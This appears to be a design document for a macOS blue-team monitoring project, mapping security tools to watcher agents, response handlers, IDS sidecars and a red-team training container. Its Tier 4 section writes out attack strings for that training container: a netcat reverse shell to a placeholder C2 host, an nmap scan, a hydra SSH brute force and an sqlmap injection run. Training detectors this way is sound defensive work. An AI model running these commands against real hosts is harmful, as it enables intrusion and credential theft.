# 🌲 Forest Blue-Team: Security Tools Integration Map

Mapping the 50-tool security list (@vivekintel) to the Forest
`forest-blue-team-guardian` architecture.

Forest already has: `ARPWatcher`, `DockerWatcher`, `NetworkWatcher`,
`IncidentResponseEngine`, `DynamicFirewallAgent`, `AgentSwarmOrchestrator`,
and a `tools/` directory of standalone utilities.

---

## Tier 1 — New Watcher Agents ✅ (Implemented in `core/watchers_extended.py`)

These map directly to the existing `BlueAgent` daemon pattern and are
**already written**.

| Tool Inspiration | Forest Class | Monitors | Threat Types |
|---|---|---|---|
| OSSEC / Wazuh | `ProcessWatcher` | `ps aux` every 20s | `suspicious_process`, `unexpected_root_process` |
| Tripwire | `FileIntegrityWatcher` | SHA-256 of `/bin/bash`, `/etc/hosts`, `/usr/sbin/sshd`, LaunchDaemons | `file_integrity_violation` |
| Fail2ban | `BruteForceWatcher` | `/var/log/system.log` SSH/auth failures | `brute_force_attempt`, `login_from_new_ip` |
| OSQuery | `ProcessNetworkWatcher` | `lsof -i -P -n` process→socket mapping | `new_listening_port`, `unexpected_network_connection` |
| YARA | `YaraPatternWatcher` | Script files in `/tmp`, `/var/tmp`, `~/Downloads` | `malware_pattern_detected` |

**To launch all 8 watchers (3 original + 5 new):**
```python
from core.watchers_extended import start_all_watchers_combined
start_all_watchers_combined()
```

---

## Tier 2 — Extend Incident Response (`incident_response.py`)

Add new `elif threat_type == "..."` branches to `_respond_phase()` for the
new threat types the extended watchers produce.

### 2a. `suspicious_process` → Kill + block
```python
elif threat_type == "suspicious_process":
    pid = details.get("pid")
    if pid:
        subprocess.run(["kill", "-9", pid], timeout=5)
        self.orchestrator.add_response_action(incident_id, f"KILLED_PID: {pid}")
        self.log_action("OFFENSIVE_PROCESS_KILLED", pid)
```

### 2b. `brute_force_attempt` → Block source IP via pf
```python
elif threat_type == "brute_force_attempt":
    source_ip = details.get("ip")
    if source_ip:
        self.firewall.block_ip(source_ip, f"brute_force_{incident_id[:8]}")
        self.orchestrator.block_ip(incident_id, source_ip)
```

### 2c. `file_integrity_violation` → Quarantine + alert
```python
elif threat_type == "file_integrity_violation":
    path = details.get("path")
    quarantine_dir = Path.home() / "ForestVault" / "quarantine"
    quarantine_dir.mkdir(exist_ok=True)
    if path and Path(path).exists():
        import shutil
        shutil.copy2(path, quarantine_dir / Path(path).name)
    self.orchestrator.add_response_action(incident_id, f"QUARANTINE_COPY: {path}")
    self.log_action("FILE_QUARANTINED", str(path))
```

### 2d. `malware_pattern_detected` → Move to quarantine
```python
elif threat_type == "malware_pattern_detected":
    file_path = details.get("file")
    quarantine_dir = Path.home() / "ForestVault" / "quarantine"
    quarantine_dir.mkdir(exist_ok=True)
    if file_path and Path(file_path).exists():
        import shutil
        dest = quarantine_dir / Path(file_path).name
        shutil.move(file_path, dest)
        self.orchestrator.add_response_action(incident_id, f"MALWARE_QUARANTINED: {dest}")
        self.log_action("MALWARE_FILE_QUARANTINED", str(dest))
```

### 2e. `new_listening_port` → Block port via pf
```python
elif threat_type == "new_listening_port":
    port = details.get("port")
    if port and port not in {22, 80, 443, 11434, 7437}:
        self.firewall.block_port(port, f"unexpected_listen_{incident_id[:8]}")
        self.orchestrator.block_port(incident_id, port)
```

---

## Tier 3 — Intel Feed Extensions

New `tools/` scripts or a future `core/intel.py` module that enrich incidents
with external threat data.

| Tool Inspiration | Implementation | Forest Hook |
|---|---|---|
| **AlienVault OTX** | `tools/otx_feed.py` — poll OTX API for malicious IPs, add to `DynamicFirewallAgent` blocklist on startup | Pre-populate `firewall.blocked_ips` from OTX pulse feeds |
| **Wazuh rules library** | Port Wazuh's OSSEC XML rules to Python dicts in `core/detection_rules.py` — 3000+ signatures for log pattern matching | Feed into `BruteForceWatcher` and `ProcessWatcher` pattern sets |
| **OpenVAS / Nessus** | `tools/vuln_scanner.py` — run `openvas-cli` or Nessus REST API weekly, store CVEs in `ForestVault/vuln_report.json` | Cross-reference listening ports with known CVE services |
| **Zeek / Bro IDS** | Docker sidecar (see Tier 5) outputs JSONL to a shared volume → new `ZeekLogWatcher` reads `conn.log` and `notice.log` | `threat_type="zeek_notice"` → `IncidentResponseEngine` |
| **Suricata** | Docker sidecar (see Tier 5) outputs `eve.json` → new `SuricataFeedWatcher` tails the file | `threat_type="suricata_alert"` with full EVE event details |

### Minimal OTX integration (drop into `tools/otx_feed.py`):
```python
import requests, json
from pathlib import Path

OTX_API_KEY = "YOUR_KEY_HERE"   # free tier available
BLOCKLIST_CACHE = Path.home() / "ForestVault" / "otx_blocklist.json"

def fetch_malicious_ips(days_back: int = 7) -> list[str]:
    url = f"https://otx.alienvault.com/api/v1/indicators/export?type=IPv4&modified_since={days_back}d"
    r = requests.get(url, headers={"X-OTX-API-KEY": OTX_API_KEY}, timeout=30)
    ips = [line.strip() for line in r.text.splitlines() if line.strip()]
    BLOCKLIST_CACHE.write_text(json.dumps(ips))
    return ips
```

---

## Tier 4 — Red Team / Decepticon Enhancements

These are **offensive tools** — they belong in the existing `decepticon_attacks.py`
Docker container to train the blue team, not in the blue-team core.

| Tool | Decepticon Attack Scenario | Blue-Team Detection |
|---|---|---|
| **Nmap / Zenmap** | Port scan from Decepticon → blue team `NetworkWatcher` detects SYN pattern | Existing: `port_scan` incident |
| **Metasploit** | Meterpreter payload dropped to `/tmp/` → Decepticon executes | `YaraPatternWatcher` hits `meterpreter_marker` signature |
| **SQLMap** | SQL injection against Dify/Ollama HTTP endpoints | `ProcessWatcher` detects `sqlmap` proc; future `ModSecurityWatcher` |
| **Hping3** | SYN flood from Decepticon container | Existing `NetworkWatcher` + new rate threshold |
| **Netcat** | Reverse shell `nc -e /bin/sh host port` | `ProcessWatcher` detects `nc`/`ncat`; `YaraPatternWatcher` hits `reverse_shell_bash` |
| **Hydra / John the Ripper** | Brute-force SSH on the host from Decepticon | `BruteForceWatcher` detects failure spike |
| **Aircrack-ng** | WiFi deauth (if testing wireless) | `ProcessWatcher` detects `aircrack-ng`/`aireplay-ng` |
| **Hashcat** | GPU password cracking process spawned | `ProcessWatcher` flags `hashcat` process |
| **Burp Suite / OWASP ZAP** | Active scan of Dify web interface | Future `WebRequestWatcher` parsing Nginx access log |

### Add to `decepticon_attacks.py`:
```python
ATTACK_SCENARIOS["nmap_full_scan"]    = "nmap -sS -p- {target}"
ATTACK_SCENARIOS["nc_reverse_shell"]  = "nc -e /bin/sh {c2_host} 4444"
ATTACK_SCENARIOS["hydra_ssh"]         = "hydra -l root -P /wordlist.txt ssh://{target}"
ATTACK_SCENARIOS["sqlmap_dify"]       = "sqlmap -u http://{target}:3000/ --batch --level=2"
```

---

## Tier 5 — Docker Sidecar Services

Run alongside the existing Forest Docker stack in `docker-compose.yml`.

### Suricata (IDS/IPS)
```yaml
suricata:
  image: jasonish/suricata:latest
  network_mode: host
  cap_add: [NET_ADMIN, SYS_NICE]
  volumes:
    - ./suricata/rules:/etc/suricata/rules
    - forestlogs:/var/log/suricata
  command: -i en0 --init-errors-fatal
```
Forest hook: new `SuricataFeedWatcher` tails `/var/log/suricata/eve.json`,
creates incidents for `alert` events.

### Zeek / Bro IDS
```yaml
zeek:
  image: zeek/zeek:latest
  network_mode: host
  volumes:
    - forestlogs:/zeek/logs
  command: zeek -i en0 local
```
Forest hook: `ZeekLogWatcher` tails `conn.log` and `notice.log`.

### Wazuh (SIEM agent mode)
```yaml
wazuh-agent:
  image: wazuh/wazuh-agent:4.7.0
  environment:
    - WAZUH_MANAGER=wazuh.your-server.io
  volumes:
    - /var/log:/var/log:ro
    - /etc:/etc:ro
```
Wazuh forwards alerts to the Forest orchestrator via a webhook bridge.

### ClamAV (on-access AV)
```yaml
clamav:
  image: clamav/clamav:latest
  volumes:
    - /tmp:/scan/tmp:ro
    - ~/Downloads:/scan/downloads:ro
    - forestlogs:/var/log/clamav
```
Forest hook: `ClamAVLogWatcher` tails `/var/log/clamav/clamd.log` for FOUND events.

---

## Not Applicable to Forest

| Tool | Reason |
|---|---|
| **Sysinternals Suite** | Windows only (Process Monitor, Autoruns, etc.) |
| **MBSA** | Microsoft Baseline Security Analyzer — Windows only |
| **SELinux / AppArmor** | Linux MAC frameworks; macOS uses TCC + SIP + Gatekeeper (different model, already enforced by OS) |
| **Kali Linux** | A distro, not a tool — Decepticon Docker already serves this purpose |
| **Security+Plus** | A certification, not software |
| **KeePass / LastPass / 1Password / Bitwarden** | Password managers — not Forest's domain |
| **VeraCrypt** | Disk encryption — orthogonal to blue-team detection |
| **GPG** | Useful for encrypting ForestVault exports at rest, but not a watcher |
| **Wireshark** (×3 in list) | GUI tool; Forest uses `pf` + `netstat` + future Zeek sidecar instead |
| **Angry IP Scanner / Zenmap** | Nmap GUI wrappers — redundant with Nmap; put in Decepticon if needed |
| **Ophcrack** | Offline Windows password cracker — irrelevant on macOS server |
| **McAfee ESM** | Commercial enterprise SIEM — replaced by Wazuh + Splunk in Tier 5 |
| **Acunetix** | Commercial web scanner — use OWASP ZAP (free) in Decepticon instead |
| **Aircrack-ng** | WiFi attack suite — irrelevant for wired M4 Mac Mini server role |
| **Security Onion** (×2) | Full-stack NSM distro; its components (Zeek, Suricata, Elasticsearch) are better used as individual Docker sidecars |
| **Splunk** | Commercial SIEM; ForestVault + JSONL logs already cover this locally. Add as optional dashboard if scale demands it |

---

## Implementation Priority Backlog

Ordered by impact/effort ratio for this specific setup (macOS, M4 Mini, Ollama).

| # | Item | Effort | Impact |
|---|---|---|---|
| 1 | ✅ `ProcessWatcher` — offensive tool process detection | Done | 🔴 Critical |
| 2 | ✅ `YaraPatternWatcher` — script malware pattern matching | Done | 🔴 Critical |
| 3 | ✅ `BruteForceWatcher` — SSH brute force via system.log | Done | 🔴 Critical |
| 4 | ✅ `FileIntegrityWatcher` — binary hash baseline | Done | 🟠 High |
| 5 | ✅ `ProcessNetworkWatcher` — lsof socket mapping | Done | 🟠 High |
| 6 | Add Tier 2 response handlers to `incident_response.py` | 1–2h | 🔴 Critical |
| 7 | Suricata Docker sidecar + `SuricataFeedWatcher` | 3–4h | 🟠 High |
| 8 | AlienVault OTX feed (`tools/otx_feed.py`) | 1h | 🟡 Medium |
| 9 | Expand Decepticon attack scenarios (Tier 4) | 2h | 🟡 Medium |
| 10 | Zeek Docker sidecar + `ZeekLogWatcher` | 4h | 🟡 Medium |
| 11 | ClamAV sidecar + `ClamAVLogWatcher` | 2h | 🟡 Medium |
| 12 | Wazuh detection rules → Python `detection_rules.py` | 4–6h | 🟡 Medium |

---

## Quick-Start: Run All 8 Watchers

```bash
cd /Users/llm01/forest-blue-team-guardian
source venv/bin/activate
python -c "from core.watchers_extended import start_all_watchers_combined; start_all_watchers_combined()"
```

Or wire into the existing `entrypoint.py`:
```python
from core.watchers_extended import start_extended_watchers
start_extended_watchers(orchestrator)   # pass the existing orchestrator instance
```
